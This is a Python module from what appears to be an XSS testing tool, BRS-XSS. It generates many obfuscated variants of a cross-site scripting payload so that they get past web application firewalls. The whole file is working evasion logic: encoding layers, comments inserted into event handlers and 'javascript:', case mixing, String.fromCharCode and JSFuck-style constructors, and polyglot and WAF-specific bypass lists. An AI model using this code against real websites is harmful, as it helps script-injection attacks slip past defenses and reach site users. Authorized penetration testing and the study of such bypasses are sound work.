#!/usr/bin/env python3

"""
BRS-XSS WAF Evasion

Main coordinator for WAF evasion techniques.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: Tue 05 Aug 2025 18:03:16 MSK
Telegram: https://t.me/EasyProTech
"""

import random
import re
from typing import List, Optional
from .evasion_types import COMMENT_PATTERNS
from .encoding_evasions import EncodingEvasions
from .polyglot_generator import PolyglotGenerator
from .waf_specific_evasions import WAFSpecificEvasions

from ..utils.logger import Logger

logger = Logger("core.advanced_waf_evasion")


class AdvancedWAFEvasion:
    """
    Main coordinator for WAF evasion techniques.
    
    Orchestrates:
    - Encoding evasions
    - Polyglot generation
    - WAF-specific bypasses
    - Comment insertion
    - Case manipulation
    """
    
    def __init__(self):
        """Initialize WAF evasion coordinator"""
        
        self.encoding_evasions = EncodingEvasions()
        self.polyglot_generator = PolyglotGenerator()
        self.waf_specific = WAFSpecificEvasions()
        
        # Case manipulation patterns
        self.case_patterns = [
            lambda x: x.lower(),
            lambda x: x.upper(),
            lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
            lambda x: ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(x)),
        ]
        
        logger.info("WAF evasion coordinator initialized")
    
    def generate_evasion_variations(self, base_payload: str, num_variations: int = 10) -> List[str]:
        """Generate multiple evasion variations of a base payload"""
        
        variations = []
        
        for _ in range(num_variations):
            payload = base_payload
            
            # Apply random evasion techniques
            techniques = [
                self.encoding_evasions.apply_unicode_encoding,
                self.encoding_evasions.apply_html_entity_encoding,
                self.encoding_evasions.apply_url_encoding,
                self._apply_comment_insertion,
                self._apply_case_manipulation,
                self.encoding_evasions.apply_whitespace_manipulation,
                self._apply_concatenation_tricks,
                self._apply_string_constructors
            ]
            
            # Apply 2-4 random techniques
            selected_techniques = random.sample(techniques, random.randint(2, 4))
            
            for technique in selected_techniques:
                try:
                    payload = technique(payload)
                except Exception as e:
                    logger.debug(f"Evasion technique failed: {e}")
                    continue
            
            if payload != base_payload and payload not in variations:
                variations.append(payload)
        
        return variations[:num_variations]
    
    def _apply_comment_insertion(self, payload: str) -> str:
        """Insert comments to break up payload patterns"""
        
        # Insert comments between script and other tags
        patterns = [
            (r'<script', f'<script{random.choice(COMMENT_PATTERNS)}'),
            (r'script>', f'script{random.choice(COMMENT_PATTERNS)}>'),
            (r'onerror', f'on{random.choice(COMMENT_PATTERNS)}error'),
            (r'onload', f'on{random.choice(COMMENT_PATTERNS)}load'),
            (r'javascript:', f'java{random.choice(COMMENT_PATTERNS)}script:'),
        ]
        
        result = payload
        for pattern, replacement in patterns:
            if re.search(pattern, result, re.IGNORECASE) and random.random() < 0.3:
                result = re.sub(pattern, replacement, result, flags=re.IGNORECASE)
                break
        
        return result
    
    def _apply_case_manipulation(self, payload: str) -> str:
        """Apply various case manipulation techniques"""
        
        # Focus on HTML tags and JavaScript keywords
        tags_and_keywords = [
            'script', 'img', 'svg', 'iframe', 'object', 'embed',
            'javascript', 'alert', 'eval', 'onerror', 'onload',
            'src', 'href', 'style'
        ]
        
        result = payload
        for item in tags_and_keywords:
            if item.lower() in result.lower() and random.random() < 0.4:
                pattern = random.choice(self.case_patterns)
                result = re.sub(
                    re.escape(item),
                    pattern(item),
                    result,
                    flags=re.IGNORECASE
                )
                break
        
        return result
    
    def _apply_concatenation_tricks(self, payload: str) -> str:
        """Apply string concatenation and construction tricks"""
        
        # JavaScript string concatenation
        if 'alert' in payload and random.random() < 0.3:
            result = payload.replace('alert', 'ale"+"rt', 1)
            return result
        
        # Character code construction
        if 'script' in payload.lower() and random.random() < 0.2:
            # Replace 'script' with character construction
            result = re.sub(
                r'script',
                'String.fromCharCode(115,99,114,105,112,116)',
                payload,
                flags=re.IGNORECASE
            )
            return result
        
        return payload
    
    def _apply_string_constructors(self, payload: str) -> str:
        """Apply string constructor techniques"""
        
        constructors = [
            ('alert', '[]["constructor"]["constructor"]("alert()")()'),
            ('eval', '[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]'),
        ]
        
        result = payload
        for target, constructor in constructors:
            if target in payload and random.random() < 0.1:  # Low probability for complex ones
                result = payload.replace(target, constructor, 1)
                break
        
        return result
    
    def get_comprehensive_bypasses(self, base_payload: str, waf_type: Optional[str] = None) -> List[str]:
        """Get set of bypass techniques"""
        
        bypasses = []
        
        # Encoding variations
        bypasses.extend(self.encoding_evasions.generate_encoded_payloads(base_payload))
        
        # Polyglot payloads
        bypasses.extend(self.polyglot_generator.generate_polyglot_payloads()[:3])
        
        # WAF-specific evasions
        if waf_type:
            bypasses.extend(self.waf_specific.apply_waf_specific_evasions(base_payload, waf_type))
        
        # General evasion variations
        bypasses.extend(self.generate_evasion_variations(base_payload, 5))
        
        return list(set(bypasses))  # Remove duplicates